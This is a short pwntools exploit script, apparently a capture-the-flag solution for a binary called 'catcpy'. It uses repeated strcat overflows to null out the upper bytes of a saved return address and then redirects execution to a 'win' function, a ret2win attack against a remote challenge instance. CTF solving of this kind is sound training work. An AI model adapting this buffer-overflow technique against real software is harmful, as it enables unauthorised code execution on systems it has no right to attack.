#!/usr/bin/env python3

from pwn import *

exe = ELF("./catcpy")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("34.170.146.252", 39696) # Given by an instancer

    return r


def main():
    r = conn()

    # Write null bytes into the last 5 bytes (the 5 MSBs) of the retaddr
    # We need to do this because we are overwriting the retaddr to __libc_start_main of 0x7cXXXXXXXXXX with 0x40XXXX using strcat, which will stop at a null byte and thus not zero out the higher bytes of the retaddr
    for i in range(5):
        r.sendlineafter(b'> ', b'1')
        r.sendafter(b'Data: ', b'A' * 0xff)
        r.sendlineafter(b'> ', b'2')
        r.sendlineafter(b'Data: ', b'A' * (0x1+0x10+0x8+0x8-1-i)) # Use strcat to buffer overflow and overwrite the last (i-1)th byte of the retaddr as a null byte

    # Perform the ret2win
    r.sendlineafter(b'> ', b'1')
    r.sendafter(b'Data: ', b'A' * 0xff)
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'Data: ', b'A' * (0x1+0x10+0x8) + p64(exe.sym.win))

    # Get the function to return to trigger the ret2win
    r.sendline(b'9')

    r.interactive()


if __name__ == "__main__":
    main()
